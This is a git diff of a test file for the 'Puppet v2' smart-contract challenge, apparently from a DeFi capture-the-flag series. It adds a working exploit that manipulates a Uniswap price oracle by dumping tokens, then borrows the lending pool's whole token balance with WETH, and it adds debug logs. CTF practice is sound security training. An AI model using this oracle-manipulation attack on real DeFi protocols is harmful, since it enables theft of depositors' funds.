@@ -84,9 +84,10 @@ describe('[Challenge] Puppet v2', function () {
         /** CODE YOUR EXPLOIT HERE */
         // Allow us to swap
         await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.utils.parseEther('1000000'));
 
         // Swap our DVT's for ETH -> drop the price of buying DVT's with ETH in puppetPool
-        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
             ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
             0,
             [this.token.address,this.weth.address], //path
@@ -94,17 +95,25 @@ describe('[Challenge] Puppet v2', function () {
             99999999999999
         );
 
-        //await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: })
+        // Swap all our eth to weth
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther("19.9")});
+
+        // Lend all the tokens from the pool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
         
 
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        // Helper logs
         let j = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        console.log(j);
-        console.log(await this.token.balanceOf(attacker.address))
-        console.log(await ethers.provider.getBalance(attacker.address))
+        console.log("Amount of weth required. ", j);
+        console.log("Attacker tokens: ", await this.token.balanceOf(attacker.address));
+        console.log("Attacker ETH: ", await ethers.provider.getBalance(attacker.address));
+        console.log("Attacker weth: ", await this.weth.balanceOf(attacker.address));
+        
         // Attacker has taken all tokens from the pool        
         expect(
             await this.token.balanceOf(this.lendingPool.address)
